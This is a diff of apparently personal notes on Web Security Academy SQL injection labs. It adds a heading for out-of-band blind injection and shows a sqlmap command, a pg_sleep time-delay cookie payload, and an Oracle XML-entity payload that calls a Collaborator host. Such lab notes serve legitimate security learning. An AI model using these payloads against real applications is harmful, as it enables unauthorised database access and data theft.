@@ -81,7 +81,8 @@ sqlmap -u 'https://0af8009d04c75cb982ec1fad00b000f3.web-security-academy.net/' -
 ** Blind SQL injection with time delays**
  Cookie: TrackingId=x' || pg_sleep(10)--; session=
 
-**Blind SQL injection with time delays and information retrieval**
+**Blind SQL injection with out-of-band interaction**
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//gey1m5rfwgrrziuc0kzjw79rbih95zto.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
  
 ## Summary
 
